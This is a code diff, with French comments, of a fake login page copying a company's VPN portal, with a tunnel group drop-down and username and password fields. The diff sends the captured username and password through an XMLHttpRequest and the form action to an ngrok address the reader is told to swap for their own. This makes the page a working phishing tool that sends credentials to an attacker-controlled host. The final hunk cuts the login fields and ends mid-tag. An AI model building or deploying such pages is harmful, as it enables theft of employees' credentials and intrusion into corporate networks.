@@ -19,14 +19,14 @@
     function formSubmit(event) {
         event.preventDefault();
         disableButton();
-        
+
         var username = document.getElementById("username").value;
         var password = document.getElementById("password_input").value;
         var formData = "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);
 
-        // Envoyer les données à Formspree
+        // Envoyer les données à votre serveur via Ngrok
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://formspree.io/f/your-form-id", true);
+        xhr.open("POST", "http://abcd1234.ngrok.io/submit", true);  // Remplacez par votre URL Ngrok
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhr.send(formData);
 
@@ -89,7 +89,7 @@
                     <tr align="center">
                         <td id="form_panel" align="middle">
                             <div style="margin-top:100px;padding:3em;">
-                                <form id="unicorn_form" method="POST" onsubmit="formSubmit(event);" autocomplete="off" action="https://formspree.io/f/your-form-id">
+                                <form id="unicorn_form" method="POST" onsubmit="formSubmit(event);" autocomplete="off" action="http://abcd1234.ngrok.io/submit">
                                     <input name="tgroup" type="hidden" value="">
                                     <input name="next" type="hidden" value="">
                                     <input name="tgcookieset" type="hidden" value="">
@@ -144,39 +144,4 @@
                                                                         <option value="Support&#x2D;D">Support&#x2D;D</option>
                                                                         <option value="TunnelGroup&#x5F;Support&#x5F;EXT">Support&#x2D;Externe</option>
                                                                         <option value="Support&#x2D;Tech&#x2D;Sage&#x2D;1000">Support&#x2D;Tech&#x2D;Sage&#x2D;1000</option>
-                                                                        <option value="Support&#x2D;Tech&#x2D;SageX3">Support&#x2D;Tech&#x2D;SageX3</option>
-                                                                        <option value="Support&#x5F;AFD">Support&#x5F;AFD</option>
-                                                                        <option value="Support&#x5F;IN">Support&#x5F;IN</option>
-                                                                        <option value="TeleTravail" selected>TeleTravail</option>
-                                                                        <option value="VPN&#x2D;N15">VPN&#x2D;N15</option>
-                                                                    </select>
-                                                                </div>
-                                                            </td>
-                                                        </tr>
-                                                        <tr height="20">
-                                                            <td nowrap id="username_field">USERNAME:</td>
-                                                            <td>
-                                                                <input autocomplete="off" id="username" name="username" style="border:1px solid gray;" value="">
-                                                            </td>
-                                                        </tr>
-                                                        <tr>
-                                                            <td nowrap id="password_field">PASSWORD:</td>
-                                                            <td>
-                                                                <input autocomplete="off" id="password_input" name="password" style="border:1px solid gray;" type="password">
-                                                            </td>
-                                                        </tr>
-                                                        <tr height="40" align="center">
-                                                            <td colspan="2" align="middle">
-                                                                <input id="submit_button" style="font-weight: bold; cursor: pointer;" type="submit" name="Login" value="Login">
-                                                            </td>
-                                                        </tr>
-                                                    </table>
-                                                </div>
-                                            </td>
-                                        </tr>
-                                    </table>
-                                </form>
-                            </div>
-                        </td>
-                    </tr>
-                </table
+                                                                        <option value="Support&#x2D;Tech&#x2D;SageX3">Support&#x
